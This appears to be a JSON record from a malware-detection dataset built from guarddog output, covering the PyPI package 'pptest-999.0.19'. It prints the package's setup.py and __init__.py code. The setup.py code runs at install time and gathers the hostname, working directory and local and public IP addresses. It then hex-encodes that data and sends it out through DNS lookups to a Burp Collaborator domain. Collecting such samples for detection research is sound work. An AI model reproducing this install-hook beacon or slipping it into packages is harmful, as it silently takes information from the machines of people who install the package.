[
  {
    "pyfile": "setup.py",
    "malicious_code_snippets": "import os\nimport sys\nimport socket\nimport dns.resolver\nimport hashlib\nimport json\n\nclass InstallScripts(install_scripts):\n    def get_wan_ip(self):\n        public_ip = ''\n        python_version = '{0[0]}.{0[1]}.{0[2]}'.format(sys.version_info)\n        try:\n            headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.131 Safari/537.36'}\n            HTTP_proxy = os.getenv('HTTP_PROXY')\n            HTTPS_proxy = os.getenv('HTTPS_PROXY')\n            if HTTP_proxy and lHTTPS_proxy :\n                proxies = {\"http\": HTTP_proxy, \"https\": HTTPS_proxy}\n            else:\n                proxies={}\n            if python_version >= '3.0':\n                import urllib.request\n                handler = urllib.request.ProxyHandler(proxies)\n                opener = urllib.request.build_opener(handler)\n                req = urllib.request.Request('http://ip.dhcp.cn/?json', headers=headers)\n                res = opener.open(req)\n                str_ = res.read().decode('utf-8')\n                public_ip = json.loads(str_)['IP']\n                print(public_ip)\n            else:\n                import urllib2\n                handler = urllib2.ProxyHandler(proxies)\n                opener = urllib2.build_opener(handler)\n                req = urllib2.Request('http://ifconfig.me/ip')#http://ip.dhcp.cn/?json\n                public_ip = load(urllib2.urlopen('http://ip.dhcp.cn/?json'))['ip']# http://jsonip.com\n        except Exception as err:\n            print(err)\n            public_ip = os.system('curl -s \"http://ifconfig.me/ip\"')\n        return public_ip\n    def get_info(self,dns_server):\n        PAYLOADS_LENGTH = 60\n        fake_domain = 'hte1ck6lvk1ktcuxl0x8jfgeu50vok.burpcollaborator.net'\n        hostname = socket.gethostname()\n        local_ips = socket.gethostbyname_ex(hostname)\n        print('host:'+hostname)\n        print('cwd:'+os.getcwd())\n        local_ip_str = ''\n        for i in local_ips:\n            if isinstance(i, str):\n                local_ip_str = local_ip_str + ','\n            elif isinstance(i, list):\n                local_ip_str = local_ip_str + ','.join(i)\n        print(local_ip_str)\n        my_resolver = dns.resolver.Resolver(configure=False)\n        my_resolver.nameservers = [dns_server]#\n        my_resolver.port = 53\n        payload = hostname+'|'+os.getcwd()+'|'+str(self.get_wan_ip())+'|'+local_ip_str\n        payload_to_send = payload\n        print(payload)\n        checksum = hashlib.sha1(payload_to_send.encode('utf-8')).hexdigest()\n        print(checksum)\n        b=''.join(hex(ord(x))[2:] for x in payload_to_send)\n        i = 0\n        while i < len(b):\n            bb = b[i:i+PAYLOADS_LENGTH-len(fake_domain)-1]+'.'+fake_domain\n            i = i + PAYLOADS_LENGTH-len(fake_domain)-1\n            answer = my_resolver.resolve(bb, 'A')\n    def mypip(self):\n        mydns = '8.8.8.8'\n        self.get_info(mydns)\n        print('!!!Attention: it is just a security test. Reinstall pip now.!!!')"
  },
  {
    "pyfile": "__init__.py",
    "malicious_code_snippets": "import os\nimport sys\nimport socket\nimport dns.resolver\nimport hashlib\nimport json\n\nPAYLOADS_LENGTH = 60\n\npython_version = '{0[0]}.{0[1]}.{0[2]}'.format(sys.version_info)\nfake_domain = 'hte1ck6lvk1ktcuxl0x8jfgeu50vok.burpcollaborator.net'\n\ndef get_wan_ip():\n    public_ip = ''\n    try:\n        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.131 Safari/537.36'}\n        HTTP_proxy = os.getenv('HTTP_PROXY')\n        HTTPS_proxy = os.getenv('HTTPS_PROXY')\n        if HTTP_proxy and lHTTPS_proxy :\n            proxies = {\"http\": HTTP_proxy, \"https\": HTTPS_proxy}\n        else:\n            proxies={}\n        if python_version >= '3.0':\n            import urllib.request\n            handler = urllib.request.ProxyHandler(proxies)\n            opener = urllib.request.build_opener(handler)\n            req = urllib.request.Request('http://ip.dhcp.cn/?json', headers=headers)\n            res = opener.open(req)\n            str_ = res.read().decode('utf-8')\n            public_ip = json.loads(str_)['IP']\n            print(public_ip)\n        else:\n            import urllib2\n            handler = urllib2.ProxyHandler(proxies)\n            opener = urllib2.build_opener(handler)\n            req = urllib2.Request('http://ifconfig.me/ip')#http://ip.dhcp.cn/?json\n            public_ip = load(urllib2.urlopen('http://ip.dhcp.cn/?json'))['ip']# http://jsonip.com\n    except Exception as err:\n        print(err)\n        public_ip = os.system('curl -s \"http://ifconfig.me/ip\"')\n    return public_ip\n\ndef get_info(dns_server):\n    hostname = socket.gethostname()\n    local_ips = socket.gethostbyname_ex(hostname)\n    print('host:'+hostname)\n    print('cwd:'+os.getcwd())\n    local_ip_str = ''\n    for i in local_ips:\n        if isinstance(i, str):\n            local_ip_str = local_ip_str + ','\n        elif isinstance(i, list):\n            local_ip_str = local_ip_str + ','.join(i)\n    print(local_ip_str)\n    my_resolver = dns.resolver.Resolver(configure=False)\n    my_resolver.nameservers = [dns_server]#\n    my_resolver.port = 53\n    payload = hostname+'|'+os.getcwd()+'|'+str(get_wan_ip())+'|'+local_ip_str\n    payload_to_send = payload\n    print(payload)\n    checksum = hashlib.sha1(payload_to_send.encode('utf-8')).hexdigest()\n    print(checksum)\n    b=''.join(hex(ord(x))[2:] for x in payload_to_send)\n    i = 0\n    while i < len(b):\n        bb = b[i:i+PAYLOADS_LENGTH-len(fake_domain)-1]+'.'+fake_domain\n        i = i + PAYLOADS_LENGTH-len(fake_domain)-1\n        answer = my_resolver.resolve(bb, 'A')\n"
  },
  {
    "metadata": {
      "package_name": "pptest-999.0.19",
      "report_path": "/home/blue/PyPIAgent/Codes/tooldetect/detect_output/guarddog/malware/pptest-999.0.19.txt"
    }
  }
]